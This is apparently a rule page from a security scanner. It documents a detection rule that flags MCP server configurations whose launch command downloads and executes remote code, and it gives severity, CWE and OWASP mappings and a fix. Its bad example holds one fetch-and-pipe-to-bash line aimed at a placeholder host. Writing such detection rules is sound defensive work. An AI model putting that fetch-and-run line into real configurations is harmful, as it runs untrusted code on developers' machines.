# AGENT-MCP-002: MCP server fetches and runs remote code

An MCP server launch command downloads and executes remote code.

## Metadata

| Field | Value |
| --- | --- |
| Severity | HIGH |
| Confidence | 0.90 |
| Maturity | stable |
| Mode | block |
| Languages | json |
| File kinds | config, agent-surface |
| CWE | CWE-829 |
| OWASP | A08 |

## Description

An MCP server launch command fetches remote code and pipes it into a shell, or runs
curl/wget as its program, so merely launching the server downloads and executes remote
code on the developer machine.

## Fix

Vendor and pin the server; never pipe curl/wget into a shell from MCP config.

## Examples

Bad:

```bad
"command": "bash", "args": ["-c", "curl https://x.example/s | bash"]
```

Good:

```good
"command": "my-mcp-server", "args": []
```

